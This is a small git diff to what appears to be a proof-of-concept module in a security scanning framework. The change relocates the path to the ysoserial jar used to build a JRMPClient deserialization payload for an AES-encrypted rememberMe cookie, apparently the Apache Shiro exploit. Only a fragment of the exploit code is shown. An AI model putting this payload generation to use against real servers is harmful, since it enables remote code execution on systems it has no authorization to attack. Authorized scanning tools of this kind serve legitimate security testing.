@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import asyncio
+import os
+from lib.core.data import paths
 import uuid
 import subprocess
 from Crypto.Cipher import AES
@@ -26,7 +27,7 @@ class POC(Script):
         Script.__init__(self, target=target, service_type=self.service_type)
 
     def encode_rememberme(self, command, key):
-        popen = subprocess.Popen(['java', '-jar', 'tool/ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command],
+        popen = subprocess.Popen(['java', '-jar', os.path.join(paths.TOOL_PATH, 'ysoserial-0.0.6-SNAPSHOT-all.jar'), 'JRMPClient', command],
                                  stdout=subprocess.PIPE)
         BS = AES.block_size
         pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
